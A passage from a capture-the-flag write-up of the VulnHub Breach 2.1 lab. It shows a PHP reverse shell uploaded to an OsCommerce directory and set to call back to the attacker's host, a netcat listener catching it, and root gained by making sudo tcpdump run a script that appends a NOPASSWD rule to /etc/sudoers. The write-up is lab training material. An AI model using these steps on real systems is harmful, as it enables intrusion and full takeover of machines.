LISTEN     0      64                  127.0.0.1:2323                          <span class="k">*</span>:<span class="k">*</span>     
LISTEN     0      128                        :::8888                         :::<span class="k">*</span>     
LISTEN     0      128                        :::60330                        :::<span class="k">*</span>     
LISTEN     0      128                        :::111                          :::<span class="k">*</span>     
LISTEN     0      128                        :::80                           :::<span class="k">*</span>
</code></pre></div></div>

<p>I interacted with that service, this is a OsCommerce page, it is an e-commerce and online store-management software program.</p>

<p>I found File Inclusion and Stored Cross Site Scripting vulnerabilities for the current version of OsCommerce, I tried to exploit the File Inclusion but didn’t work.</p>

<p><img src="/assets/images/breach2/screenshot-9.png" alt="" /></p>

<p>If we remember we have the login credentials to OsCommerce, I tried but didn’t work, so I logged in with admin as username and password.</p>

<p><img src="/assets/images/breach2/screenshot-10.png" alt="" /></p>

<p>Searching a way to upload a file, I found the path Tools -&gt; File Manager that allows create and upload files, but we don’t have permissions for that, so I decided to go back to the target machine and search for writable directories.</p>

<p><img src="/assets/images/breach2/screenshot-11.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>milton@breach2:/var/www/html2/oscommerce<span class="nv">$ </span>find <span class="nb">.</span> <span class="nt">-writable</span> <span class="nt">-type</span> d 2&gt;/dev/null 
./includes/work
</code></pre></div></div>

<p>I found a directory writable in /var/www/html2/oscommerce/includes/work, I located there and upload a PHP reverse shell.</p>

<p><img src="/assets/images/breach2/screenshot-12.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php shell.php
root@kali:~/breach2.1<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/127.0.0.1/192.168.110.150/;s/1234/443/'</span> shell.php
</code></pre></div></div>
<p><img src="/assets/images/breach2/screenshot-13.png" alt="" /></p>

<p>As we see our reverse shell was uploaded as the user blumbrgh.</p>

<p><img src="/assets/images/breach2/screenshot-14.png" alt="" /></p>

<p>Then, we start a netcat listener and run the reverse shell, now we are the user blumbergh.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.110.151:8888/oscommerce/includes/work/shell.php
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/breach2.1<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.110.150] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.110.151] 51353
Linux breach2 3.16.0-4-amd64 <span class="c">#1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64 GNU/Linux</span>
 17:03:54 up  3:07,  1 user,  load average: 0.03, 0.15, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
milton   pts/1    localhost        14:14   23:35   2.76s  2.61s <span class="nt">-bash</span>
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span>,1004<span class="o">(</span>fin<span class="o">)</span>
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ bash -i
bash: cannot set terminal process group (499): Inappropriate ioctl for device
bash: no job control in this shell
blumbergh@breach2:/$ 
</span></code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>

<p>Then I check for sudo permissions, blembergh can execute tcpdump as sudo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blumbergh@breach2:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>blumbergh on breach2:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User blumbergh may run the following commands on breach2:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/sbin/tcpdump

</code></pre></div></div>

<p>Next what I did was send the user blumbergh to the sudoers group to execute the bash command as root without providing password via tcpdump tool, for more information you can check it <a href="https://pure.security/how-i-got-root-with-sudo/">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blumbergh@breach2:/<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">$'id</span><span class="se">\n</span><span class="s1">echo "blumbergh ALL=(ALL) NOPASSWD: /bin/bash" &gt;&gt; /etc/sudoers'</span> <span class="o">&gt;</span> /dev/shm/r00t 
blumbergh@breach2:/<span class="nv">$ </span><span class="nb">chmod</span> +x /dev/shm/r00t 
blumbergh@breach2:/<span class="nv">$ </span><span class="nb">sudo </span>tcpdump <span class="nt">-ln</span> <span class="nt">-i</span> eth0 <span class="nt">-w</span> /dev/null <span class="nt">-W</span> 1 <span class="nt">-G</span> 1 <span class="nt">-z</span> /dev/shm/r00t <span class="nt">-Z</span> root
dropped privs to root
tcpdump: listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 262144 bytes
Maximum file limit reached: 1
blumbergh@breach2:/<span class="nv">$ uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>

blumbergh@breach2:/<span class="nv">$ </span><span class="nb">sudo</span> /bin/bash
root@breach2:/# <span class="nb">cd
</span>root@breach2:~# python .flag.py
python .flag.py


<span class="c">#========================================================================================#</span>
<span class="c"># ___                                               ___                                  #</span>
<span class="c">#(   )                                             (   )                                 #</span>
<span class="c"># | |.-.    ___ .-.      .--.     .---.    .--.     | | .-.       .--.             .-.   #</span>
<span class="c"># | /   \  (   )   \    /    \   / .-, \  /    \    | |/   \     ;  _  \         /    \  #</span>
<span class="c"># |  .-. |  | ' .-. ;  |  .-. ; (__) ; | |  .-. ;   |  .-. .    (___)` |        |  .-. ; #</span>
<span class="c"># | |  | |  |  / (___) |  | | |   .'`  | |  |(___)  | |  | |         ' '        | |  | | #</span>
<span class="c"># | |  | |  | |        |  |/  |  / .'| | |  |       | |  | |        / /         | |  | | #</span>
<span class="c"># | |  | |  | |        |  ' _.' | /  | | |  | ___   | |  | |       / /          | |  | | #</span>
<span class="c"># | '  | |  | |        |  .'.-. ; |  ; | |  '(   )  | |  | |      / /      .-.  | '  | | #</span>
<span class="c"># ' `-' ;   | |        '  `-' / ' `-'  | '  `-' |   | |  | |     / '____  (   ) '  `-' / #</span>
<span class="c">#  `.__.   (___)        `.__.'  `.__.'_.  `.__,'   (___)(___)   (_______)  `-'   `.__,'  # </span>
<span class="c">#                                                                                        #</span>
<span class="c">#========================================================================================#</span>


Congratulations on reaching the end. I have learned a ton putting together these challenges and I hope you enjoyed it and perhaps learned something new. Stay tuned 
<span class="k">for </span>the final <span class="k">in </span>the series, Breach 3.0

Shout-out to sizzop, knightmare and rastamouse <span class="k">for </span>testing and g0tmi1k <span class="k">for </span>hosting and maintaining <span class="c">#vulnhub.</span>

<span class="nt">-mrb3n</span>
</code></pre></div></div>

:ET